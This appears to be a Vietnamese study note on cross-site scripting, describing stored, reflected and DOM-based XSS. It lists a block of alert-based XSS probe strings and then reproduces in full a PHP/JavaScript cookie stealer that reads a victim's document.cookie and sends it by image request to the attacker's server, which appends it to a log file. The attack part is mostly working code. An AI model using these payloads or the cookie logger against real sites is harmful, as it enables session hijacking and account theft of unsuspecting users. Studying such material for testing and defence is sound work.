#A3-Cross-Site Scripting (XSS)
### khái quát
XSS được viết tắt bởi Cross-Site-Scripting. Nó là một phương pháp tấn công cơ bản. Nó dựa trên việc thực thi HTML và JavaScript trên một trang web. Việc tấn công này có thể xảy ra khi xác nhận những lệnh ở các text-box, hoặc cũng có thể là trên thanh URL. Những kết quả được đọc dưới dạng HTML, vì vậy nó sử dụng một vài thủ thuật Social-Engineering để tác động đến 1 ai đó tải một virus mà chính bạn đã tạo ra, và là tiềm năng cho một botnet, hoặc RAT, cũng có thể là 1 keylogger. XSS có thể trở nên rất nguy hiểm, Nhưng cũng có thể rất vô hại.
### gồm 3 loại
- STORED-XSS :  chèn đoạn js thông qua lưu trữ , vd gửi tn đến admin

-  REFLECTED-XSS: Khác với Stored-XSS, Reflected-XSS đoạn mã khai thác sẽ không được lưu trữ trên server , chèn js vào mục tìm kiến hay cmt...

- xss dom based : chưa nắm rõ

các đoạn mã check lỗi
```

"><script>alert("XSS")</script>
"><script>alert(String.fromCharCode(88,83,83)) </script>
'><script>alert("XSS")</script>
'><script>alert(String.fromCharCode(88,83,83))</script>
<ScRIPt>aLeRT("XSS")</ScRIPt>
<ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>
"><ScRIPt>aLeRT("XSS")</ScRIPt>
"><ScRIPt<aLeRT(String.fromCharCode(88,83,83)) </ScRIPt>
'><ScRIPt>aLeRT("XSS")</ScRIPt>
'><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>
</script><script>alert("XSS")</script>
</script><script>alert(String.fromCharCode(88,83,83) )</script>
"/><script>alert("XSS")</script>
"/><script>alert(String.fromCharCode(88,83,83))</script>
'/><script>alert("XSS")</script>
'/><script>alert(String.fromCharCode(88,83,83))</script>
</SCRIPT>"><SCRIPT>alert("XSS")</SCRIPT>
</SCRIPT>"><SCRIPT>alert(String.fromCharCode(88,83,8 3))
</SCRIPT>">"><SCRIPT>alert("XSS")</SCRIPT>
</SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83 ,83))</SCRIPT>
";alert("XSS");"
";alert(String.fromCharCode(88,83,83));"
';alert("XSS");'
';alert(String.fromCharCode(88,83,83));'
";alert("XSS")
";alert(String.fromCharCode(88,83,83))
';alert("XSS")
';alert(String.fromCharCode(88,83,83))

```
 - đoạn PHP get cookie
 
 ```
 <?php
/*
* Created on 16. april. 2007 Được tạo ngày 16/8/2007
* Created by Audun Larsen (audun@munio.no)- Tác giả-
*
* Copyright 2006 Munio IT, Audun Larsen
*
* THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
* INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
* FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
* (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
* OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
* OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

if(strlen($_SERVER['QUERY_STRING']) > 0) {
$fp=fopen('./CookieLog.txt', 'a');
fwrite($fp, urldecode($_SERVER['QUERY_STRING'])."\n");
fclose($fp);
} else {
?>

var ownUrl = 'http://<?php echo $_SERVER['HTTP_HOST']; ?><?php echo $_SERVER['PHP_SELF']; ?>';

// ==
// URLEncode and URLDecode functions
//
// Copyright Albion Research Ltd. 2002
// http://www.albionresearch.com/
//
// You may copy these functions providing that
// (a) you leave this copyright notice intact, and
// (b) if you use these functions on a publicly accessible
// web site you include a credit somewhere on the web site
// with a link back to http://www.albionresearch.com/
//
// If you find or fix any bugs, please let us know at albionresearch.com
//
// SpecialThanks to Neelesh Thakur for being the first to
// report a bug in URLDecode() - now fixed 2003-02-19.
// And thanks to everyone else who has provided comments and suggestions.
// ==
function URLEncode(str)
{
// The Javascript escape and unescape functions do not correspond
// with what browsers actually do...
var SAFECHARS = "0123456789" + // Numeric
"ABCDEFGHIJKLMNOPQRSTUVWXYZ" + // Alphabetic
"abcdefghijklmnopqrstuvwxyz" +
"-_.!~*'()"; // RFC2396 Mark characters
var HEX = "0123456789ABCDEF";

var plaintext = str;
var encoded = "";
for (var i = 0; i < plaintext.length; i++ ) {
var ch = plaintext.charAt(i);
if (ch == " ") {
encoded += "+"; // x-www-urlencoded, rather than %20
} else if (SAFECHARS.indexOf(ch) != -1) {
encoded += ch;
} else {
var charCode = ch.charCodeAt(0);
if (charCode > 255) {
alert( "Unicode Character '"
+ ch
+ "' cannot be encoded using standard URL encoding.\n" +
"(URL encoding only supports 8-bit characters.)\n" +
"A space (+) will be substituted." );
encoded += "+";
} else {
encoded += "%";
encoded += HEX.charAt((charCode >> 4) & 0xF);
encoded += HEX.charAt(charCode & 0xF);
}
}
} // for

return encoded;
};

cookie = URLEncode(document.cookie);
html = '<img src="'+ownUrl+'?'+cookie+'">';
document.write(html);

< ?php
}
?>
``` 
